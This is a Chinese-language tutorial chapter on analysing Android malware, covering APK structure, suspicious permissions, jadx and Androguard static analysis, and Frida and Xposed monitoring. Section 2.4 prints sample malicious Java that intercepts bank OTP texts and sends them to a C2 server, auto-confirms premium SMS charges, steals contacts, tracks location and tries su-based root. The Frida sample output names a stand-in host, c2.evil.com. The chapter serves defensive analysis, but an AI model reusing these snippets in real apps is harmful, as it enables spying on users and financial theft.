# Android 恶意代码分析

### 2.1 APK 结构与恶意代码特征

APK 是 Android 应用的安装包格式，恶意代码分析的第一步是理解 APK 结构并识别其中的恶意特征。

```
恶意 APK 结构分析：
malicious.apk
├── AndroidManifest.xml        # 权限声明、组件配置（恶意代码分析重点）
├── classes.dex                # 主 DEX（可能含恶意逻辑）
├── classes2.dex               # 多 DEX（恶意代码可能隐藏于此）
├── resources.arsc             # 资源索引
├── res/                       # 资源文件（可能含加密配置）
├── assets/                    # 原始资源（DEX/SO 恶意载荷可能隐藏于此）
│   ├── payload.dex            # 隐藏的恶意 DEX
│   └── config.bin             # 加密的 C&C 配置
├── lib/                       # Native 库
│   └── arm64-v8a/
│       └── libnative.so       # Native 恶意代码（Root exploit 等）
└── META-INF/                  # 签名信息
```

**权限分析（Malicious Permission Pattern）**：

```xml
<!-- 恶意代码典型权限组合 -->

<!-- 短信相关（银行木马特征） -->
<uses-permission android:name="android.permission.READ_SMS" />
<uses-permission android:name="android.permission.SEND_SMS" />
<uses-permission android:name="android.permission.RECEIVE_SMS" />
<uses-permission android:name="android.permission.RECEIVE_MMS" />

<!-- 通讯录/通话相关（间谍软件特征） -->
<uses-permission android:name="android.permission.READ_CONTACTS" />
<uses-permission android:name="android.permission.READ_CALL_LOG" />
<uses-permission android:name="android.permission.RECORD_AUDIO" />
<uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />

<!-- 位置追踪（间谍软件/跟踪软件特征） -->
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />

<!-- 系统操作（勒索软件/Rootkit 特征） -->
<uses-permission android:name="android.permission.DEVICE_POWER" />  <!-- 锁屏 -->
<uses-permission android:name="android.permission.WRITE_SETTINGS" />
<uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />

<!-- 网络通信（C&C通信特征） -->
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" /> <!-- 开机自启 -->

<!-- 危险权限组合（高度可疑） -->
<!-- SMS + INTERNET + RECEIVE_BOOT_COMPLETED → 银行木马 -->
<!-- RECORD_AUDIO + CAMERA + INTERNET → 间谍软件 -->
<!-- WRITE_SETTINGS + DEVICE_POWER + REQUEST_INSTALL_PACKAGES → 勒索/锁机 -->
```

**组件分析**：

```xml
<!-- 恶意代码典型组件特征 -->

<!-- 1. 隐蔽启动的 Service（无图标 Activity） -->
<activity android:name=".Main" android:excludeFromRecents="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <!-- 注意：没有 LAUNCHER category，应用不在桌面显示图标 -->
    </intent-filter>
</activity>

<!-- 2. 开机自启 BroadcastReceiver -->
<receiver android:name=".BootReceiver">
    <intent-filter android:priority="1000">
        <action android:name="android.intent.action.BOOT_COMPLETED" />
        <action android:name="android.intent.action.QUICKBOOT_POWERON" />
    </intent-filter>
</receiver>

<!-- 3. 短信拦截 Receiver（银行木马特征） -->
<receiver android:name=".SmsReceiver" android:priority="999">
    <intent-filter>
        <action android:name="android.provider.Telephony.SMS_RECEIVED" />
    </intent-filter>
</receiver>
<!-- priority="999" 确保在系统短信应用之前收到短信 -->

<!-- 4. 无界面的后台 Service -->
<service android:name=".CoreService" android:exported="false" />
```

**Native 库分析**：

```bash
# 提取 SO 文件并分析
unzip -o malicious.apk -d ./apk_extracted/

# 分析 SO 文件
file ./apk_extracted/lib/arm64-v8a/libnative.so
# 输出：ELF 64-bit LSB shared object, ARM aarch64

# 使用 readelf 查看导出函数
readelf -sW ./apk_extracted/lib/arm64-v8a/libnative.so | grep -i "func\|init\|hook\|root\|exploit"
# 关注以下函数名：
# - JNI_OnLoad：Native 初始化入口
# - root_exploit / getroot：提权 exploit
# - hook_input / hook_dispatch：输入 Hook
# - send_data / encrypt_data：数据外传

# 使用 strings 提取字符串
strings ./apk_extracted/lib/arm64-v8a/libnative.so | grep -iE "http|cmd|shell|root|exploit"
# 重点关注：
# - C&C 服务器地址
# - Shell 命令字符串
# - Root exploit 相关字符串
# - 加密密钥/配置
```

### 2.2 静态分析方法

**jadx 反编译与代码分析**：

```bash
# 安装 jadx
# 下载: https://github.com/skylot/jadx/releases
# 使用:
jadx -d ./output_dir malicious.apk

# jadx 命令行参数
jadx --show-bad-code -d ./output malicious.apk      # 显示无法完美反编译的代码
jadx --no-res -d ./output malicious.apk              # 不反编译资源
jadx --deobf -d ./output malicious.apk              # 启用去混淆
jadx -j 4 -d ./output malicious.apk                  # 4线程并行

# 反编译后的目录结构
./output/
├── sources/
│   └── com/
│       └── malicious/
│           ├── MainActivity.java
│           ├── CoreService.java          # 核心恶意逻辑
│           ├── SmsReceiver.java          # 短信拦截
│           ├── BootReceiver.java         # 开机自启
│           ├── Crypto.java               # 加密/解密
│           └── NativeBridge.java         # JNI 调用
└── resources/
    ├── AndroidManifest.xml
    └── res/
```

**字符串提取与分类**：

```python
#!/usr/bin/env python3
"""
APK 恶意字符串提取与分类工具
自动提取 APK 中的敏感字符串并分类标记
"""

import re
import os
import subprocess
import json
from collections import defaultdict

class APKStringAnalyzer:
    def __init__(self, apk_path):
        self.apk_path = apk_path
        self.findings = defaultdict(list)

    def extract_strings(self):
        """使用 strings 命令提取所有字符串"""
        # 解压 APK
        extract_dir = f"/tmp/apk_extract_{os.getpid()}"
        subprocess.run(["unzip", "-o", self.apk_path, "-d", extract_dir],
                       capture_output=True)

        results = {}

        # 分析 DEX 文件
        for dex_file in self._find_files(extract_dir, ".dex"):
            strings = self._extract_strings_from_dex(dex_file)
            results[dex_file] = strings

        # 分析 SO 文件
        for so_file in self._find_files(extract_dir, ".so"):
            strings = self._extract_strings_from_so(so_file)
            results[so_file] = strings

        # 分析 XML/JSON 等配置文件
        for xml_file in self._find_files(extract_dir, ".xml"):
            with open(xml_file, 'r', errors='ignore') as f:
                results[xml_file] = f.read()

        return results

    def analyze_malicious_patterns(self, strings_by_file):
        """分析恶意模式"""
        patterns = {
            'C2_URL': r'https?://[a-zA-Z0-9.\-]+(?:/[^\s]*)?',
            'IP_ADDRESS': r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b',
            'SMS_KEYWORDS': r'(短信|验证码|otp|sms|verification)',
            'BANK_APPS': r'(com\.icbc|com\.bankofchina|com\.ccb|com\.abc|cn\.com\.spdb)',
            'ROOT_COMMANDS': r'(su |chmod |mount |/system/|/data/local/)',
            'CRYPTO_KEYWORDS': r'(AES|RSA|encrypt|decrypt|cipher|key=)',
            'PHONE_INFO': r'(imei|imsi|phone|getDeviceId|getSubscriberId)',
            'CONTACT_ACCESS': r'(contacts|通讯录|getContact)',
            'LOCATION_ACCESS': r'(location|gps|getLatitude|getLongitude)',
            'DOWNLOAD_URL': r'(download|\.apk|\.dex|\.so)',
            'EXPLOIT_KEYWORDS': r'(exploit|root|privilege|escalation)',
            'DYNAMIC_LOADING': r'(DexClassLoader|loadClass|loadDex|reflect)',
        }

        for file_path, content in strings_by_file.items():
            for pattern_name, pattern in patterns.items():
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    unique_matches = list(set(matches))
                    for match in unique_matches:
                        self.findings[pattern_name].append({
                            'file': file_path,
                            'match': match
                        })

        return dict(self.findings)

    def _extract_strings_from_dex(self, dex_path):
        """从 DEX 文件提取字符串"""
        # 使用 baksmali 或 dexdump
        result = subprocess.run(
            ["strings", dex_path],
            capture_output=True, text=True
        )
        return result.stdout

    def _extract_strings_from_so(self, so_path):
        """从 SO 文件提取字符串"""
        result = subprocess.run(
            ["strings", so_path],
            capture_output=True, text=True
        )
        return result.stdout

    def _find_files(self, directory, extension):
        """递归查找指定扩展名的文件"""
        found = []
        for root, dirs, files in os.walk(directory):
            for file in files:
                if file.endswith(extension):
                    found.append(os.path.join(root, file))
        return found

    def generate_report(self):
        """生成分析报告"""
        strings = self.extract_strings()
        findings = self.analyze_malicious_patterns(strings)

        print("\n" + "=" * 60)
        print("APK 恶意字符串分析报告")
        print("=" * 60)

        for category, items in findings.items():
            print(f"\n[{category}] ({len(items)} 个匹配)")
            for item in items[:10]:  # 每类最多显示10个
                print(f"  {item['match']} ({os.path.basename(item['file'])})")

        return findings
```

**API 调用追踪**：

```bash
# 使用 Androguard 进行 API 调用分析
pip install androguard

# Python 脚本：API 调用追踪
python3 -c "
from androguard.misc import AnalyzeAPK
from androguard.core.analysis import analysis

a, d, dx = AnalyzeAPK('malicious.apk')

# 1. 查找所有敏感 API 调用
sensitive_apis = [
    'getDeviceId',        # IMEI 获取
    'getSubscriberId',    # IMSI 获取
    'getLine1Number',     # 手机号获取
    'getCellLocation',    # 位置获取
    'sendTextMessage',    # 发送短信
    'getDefaultSensor',  # 传感器
    'getInputStream',     # 网络请求
    'loadClass',          # 动态加载
    'exec',               # 命令执行
    'getInstalledPackages', # 应用列表
    'getAddress',         # 通讯录
    'Cipher',             # 加密操作
]

for api in sensitive_apis:
    xrefs = dx.get_xrefs_from_method(api)
    if xrefs:
        print(f'[!] {api} 被调用:')
        for cls, method in xrefs:
            print(f'    -> {cls}.{method}')
"
```

**权限映射分析**：

```python
#!/usr/bin/env python3
"""
权限到 API 的映射分析
验证声明的权限是否被合理使用，识别过度权限请求
"""

PERMISSION_API_MAP = {
    'android.permission.READ_SMS': {
        'apis': ['getMessagesFromUri', 'getContentResolver().query'],
        'risk': '读取用户短信（银行木马核心行为）',
        'benign_use': '短信备份应用'
    },
    'android.permission.RECEIVE_SMS': {
        'apis': ['onReceive', 'SMS_RECEIVED'],
        'risk': '拦截短信（可截获验证码）',
        'benign_use': '短信通知应用'
    },
    'android.permission.RECORD_AUDIO': {
        'apis': ['MediaRecorder', 'AudioRecord'],
        'risk': '录音（窃听）',
        'benign_use': '录音机/语音助手'
    },
    'android.permission.ACCESS_FINE_LOCATION': {
        'apis': ['getLastKnownLocation', 'requestLocationUpdates'],
        'risk': '追踪用户位置',
        'benign_use': '地图/导航应用'
    },
    'android.permission.READ_CONTACTS': {
        'apis': ['getContact', 'ContactsContract'],
        'risk': '窃取通讯录',
        'benign_use': '通讯录管理/社交应用'
    },
    'android.permission.SEND_SMS': {
        'apis': ['sendTextMessage', 'sendMultipartTextMessage'],
        'risk': '发送扣费短信/传播恶意链接',
        'benign_use': '短信应用'
    },
    'android.permission.REQUEST_INSTALL_PACKAGES': {
        'apis': ['startActivity', 'ACTION_INSTALL_PACKAGE'],
        'risk': '静默安装恶意应用',
        'benign_use': '应用商店'
    }
}

def analyze_permissions(apk):
    """分析权限使用情况"""
    declared_perms = apk.get_permissions()

    print("\n权限风险分析:")
    print("=" * 60)

    for perm in declared_perms:
        if perm in PERMISSION_API_MAP:
            mapping = PERMISSION_API_MAP[perm]
            print(f"\n权限: {perm}")
            print(f"  风险: {mapping['risk']}")
            print(f"  正当用途: {mapping['benign_use']}")
            # 进一步检查实际 API 调用
            # ...
```

### 2.3 动态分析方法

**Frida Hook 动态分析**：

```javascript
// frida_malware_analyzer.js
// 综合恶意行为监控脚本

Java.perform(function() {
    // ============ 短信监控 ============
    var SmsManager = Java.use('android.telephony.SmsManager');
    SmsManager.sendTextMessage.overload(
        'java.lang.String', 'java.lang.String', 'java.lang.String',
        'android.app.PendingIntent', 'android.app.PendingIntent'
    ).implementation = function(destAddr, scAddr, text, sentIntent, deliveryIntent) {
        console.log('[SMS] 发送短信到: ' + destAddr);
        console.log('[SMS] 内容: ' + text);
        return this.sendTextMessage(destAddr, scAddr, text, sentIntent, deliveryIntent);
    };

    // ============ 位置监控 ============
    var LocationManager = Java.use('android.location.LocationManager');
    LocationManager.getLastKnownLocation.implementation = function(provider) {
        var location = this.getLastKnownLocation(provider);
        if (location) {
            console.log('[LOCATION] 获取位置: lat=' + location.getLatitude() +
                       ', lng=' + location.getLongitude());
        }
        return location;
    };

    // ============ 通讯录窃取监控 ============
    var ContentResolver = Java.use('android.content.ContentResolver');
    ContentResolver.query.overload(
        'android.net.Uri', '[Ljava.lang.String;',
        'java.lang.String', '[Ljava.lang.String;', 'java.lang.String'
    ).implementation = function(uri, projection, selection, selectionArgs, sortOrder) {
        var uriStr = uri.toString();
        if (uriStr.indexOf('contacts') !== -1 || uriStr.indexOf('sms') !== -1) {
            console.log('[CONTENT] 查询敏感URI: ' + uriStr);
        }
        return this.query(uri, projection, selection, selectionArgs, sortOrder);
    };

    // ============ 网络通信监控 ============
    var URL = Java.use('java.net.URL');
    URL.$init.overload('java.lang.String').implementation = function(url) {
        console.log('[NETWORK] 连接: ' + url);
        return this.$init(url);
    };

    // ============ 命令执行监控 ============
    var Runtime = Java.use('java.lang.Runtime');
    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {
        console.log('[EXEC] 执行命令: ' + cmd);
        return this.exec(cmd);
    };

    // ============ 动态加载监控 ============
    var DexClassLoader = Java.use('dalvik.system.DexClassLoader');
    DexClassLoader.$init.overload(
        'java.lang.String', 'java.lang.String', 'java.lang.String', 'java.lang.ClassLoader'
    ).implementation = function(dexPath, optimizedDir, librarySearchPath, parent) {
        console.log('[DEX] 动态加载: ' + dexPath);
        console.log('[DEX] 库搜索路径: ' + librarySearchPath);
        return this.$init(dexPath, optimizedDir, librarySearchPath, parent);
    };

    // ============ 录音监控 ============
    var MediaRecorder = Java.use('android.media.MediaRecorder');
    MediaRecorder.start.implementation = function() {
        console.log('[AUDIO] 开始录音');
        return this.start();
    };

    // ============ 设备信息获取监控 ============
    var TelephonyManager = Java.use('android.telephony.TelephonyManager');
    TelephonyManager.getDeviceId.implementation = function() {
        var imei = this.getDeviceId();
        console.log('[PHONE] 获取IMEI: ' + imei);
        return imei;
    };
    TelephonyManager.getLine1Number.implementation = function() {
        var number = this.getLine1Number();
        console.log('[PHONE] 获取手机号: ' + number);
        return number;
    };
});

// Native 层监控
Interceptor.attach(Module.findExportByName('libc.so', 'system'), {
    onEnter: function(args) {
        var cmd = Memory.readCString(args[0]);
        console.log('[NATIVE EXEC] ' + cmd);
    }
});

Interceptor.attach(Module.findExportByName('libc.so', 'open'), {
    onEnter: function(args) {
        var path = Memory.readCString(args[0]);
        if (path.indexOf('/proc/') !== -1 || path.indexOf('/data/') !== -1) {
            console.log('[NATIVE OPEN] ' + path);
        }
    }
});
```

**启动 Frida 监控**：

```bash
# 启动 frida-server（设备端）
adb shell "su -c '/data/local/tmp/frida-server &'"

# 启动恶意应用并注入监控脚本
frida -U -f com.malicious.app -l frida_malware_analyzer.js --no-pause

# 或附加到已运行的应用
frida -U com.malicious.app -l frida_malware_analyzer.js

# 输出示例：
# [SMS] 发送短信到: 1066988888
# [SMS] 内容: 计费2元
# [PHONE] 获取IMEI: 358240051111110
# [NETWORK] 连接: http://c2.evil.com/report
# [CONTENT] 查询敏感URI: content://com.android.contacts/...
# [DEX] 动态加载: /data/data/com.malicious.app/files/payload.dex
# [EXEC] 执行命令: su -c chmod 777 /data/data/com.malicious.app
```

**Xposed 模块分析**：

```java
// Xposed 恶意行为监控模块
public class MalwareMonitor implements IXposedHookLoadPackage {
    @Override
    public void handleLoadPackage(LoadPackageParam lpparam) throws Throwable {
        // 监控所有应用的敏感行为
        if (!lpparam.packageName.equals("com.malicious.app")) return;

        // Hook 短信发送
        XposedHelpers.findAndHookMethod(
            "android.telephony.SmsManager",
            lpparam.classLoader,
            "sendTextMessage",
            String.class, String.class, String.class,
            PendingIntent.class, PendingIntent.class,
            new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) {
                    String dest = (String) param.args[0];
                    String text = (String) param.args[2];
                    XposedBridge.log("[MONITOR] SMS to " + dest + ": " + text);
                }
            }
        );

        // Hook IMEI 获取
        XposedHelpers.findAndHookMethod(
            "android.telephony.TelephonyManager",
            lpparam.classLoader,
            "getDeviceId",
            new XC_MethodHook() {
                @Override
                protected void afterHookedMethod(MethodHookParam param) {
                    XposedBridge.log("[MONITOR] IMEI: " + param.getResult());
                }
            }
        );
    }
}
```

**沙箱行为监控**：

```bash
# 使用 MobSF 进行动态分析
# MobSF 内置动态分析沙箱

# Docker 部署 MobSF
docker run -it --rm \
  -p 8000:8000 -p 8001:8001 \
  -e MOBSF_ANALYZER_IDENTIFIER=<emulator_id> \
  opensecurity/mobile-security-framework-mobsf

# 通过 API 触发动态分析
curl -X POST http://localhost:8000/api/v1/dynamic_analyze \
  -F "hash=<apk_md5>" \
  -F "avd_name=<avd_id>"

# 获取动态分析报告
curl http://localhost:8000/api/v1/dynamic_report_json?hash=<apk_md5>
```

### 2.4 常见恶意行为分析

**短信拦截与扣费**：

```java
// 恶意短信拦截器（典型银行木马行为）
public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        // 拦截短信
        Object[] pdus = (Object[]) intent.getExtras().get("pdus");
        for (Object pdu : pdus) {
            SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu);
            String sender = message.getOriginatingAddress();
            String body = message.getMessageBody();

            // 检查是否包含银行验证码
            if (body.matches(".*验证码.*\\d{4,6}.*") ||
                body.matches(".*OTP.*\\d{4,6}.*")) {
                // 提取验证码
                String otp = body.replaceAll(".*?(\\d{4,6}).*", "$1");

                // 上报到 C&C 服务器
                sendToC2("otp=" + otp + "&from=" + sender);

                // 终止广播，阻止系统短信应用收到
                abortBroadcast();
            }

            // 检查是否包含扣费短信
            if (sender.matches("10\\d{5,8}")) {
                // 自动回复扣费确认
                SmsManager.getDefault().sendTextMessage(
                    sender, null, "Y", null, null
                );
                abortBroadcast();
            }
        }
    }
}
```

**通讯录窃取**：

```java
// 恶意通讯录窃取行为
public class ContactStealer {
    public void stealContacts(Context context) {
        Cursor cursor = context.getContentResolver().query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            new String[]{Phone.DISPLAY_NAME, Phone.NUMBER},
            null, null, null
        );

        JSONArray contacts = new JSONArray();
        while (cursor.moveToNext()) {
            String name = cursor.getString(0);
            String number = cursor.getString(1);

            JSONObject contact = new JSONObject();
            contact.put("name", name);
            contact.put("phone", number);
            contacts.put(contact);
        }
        cursor.close();

        // 上传到 C&C
        uploadToC2("contacts", contacts.toString());
    }
}
```

**位置追踪**：

```java
// 恶意位置追踪
public class LocationTracker implements LocationListener {
    public void startTracking(Context context) {
        LocationManager lm = (LocationManager)
            context.getSystemService(Context.LOCATION_SERVICE);

        // 请求高频位置更新
        lm.requestLocationUpdates(
            LocationManager.GPS_PROVIDER,
            1000,  // 1秒间隔
            0,     // 0米变化
            this
        );
    }

    @Override
    public void onLocationChanged(Location location) {
        // 上报位置
        String data = String.format("lat=%f&lng=%f&time=%d",
            location.getLatitude(),
            location.getLongitude(),
            location.getTime());
        uploadToC2("location", data);
    }
}
```

**ROOT 提权 exploit**：

```java
// 恶意 Root exploit 实现
public class RootExploit {
    public boolean tryRoot() {
        // 尝试常见提权路径
        String[] suPaths = {
            "/system/bin/su",
            "/system/xbin/su",
            "/sbin/su",
            "/system/sd/xbin/su",
            "/system/bin/failsafe/su"
        };

        for (String path : suPaths) {
            File suFile = new File(path);
            if (suFile.exists()) {
                // 尝试执行 su
                try {
                    Process p = Runtime.getRuntime().exec(path);
                    DataOutputStream os = new DataOutputStream(p.getOutputStream());
                    os.writeBytes("id\n");
                    os.flush();
                    BufferedReader reader = new BufferedReader(
                        new InputStreamReader(p.getInputStream()));
                    String line = reader.readLine();
                    if (line != null && line.contains("uid=0")) {
                        return true; // Root 成功
                    }
                } catch (Exception e) {
                    // 尝试其他 exploit
                    tryNativeExploit();
                }
            }
        }
        return false;
    }

    // Native exploit（利用内核漏洞）
    private native void tryNativeExploit();
}
```

---

---

## 📋 内容审核与补充建议

> 针对「Android 恶意代码分析」部分的内容审核结果：

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 🛡️ 防御方案
- ⚠️ 缺少defense相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
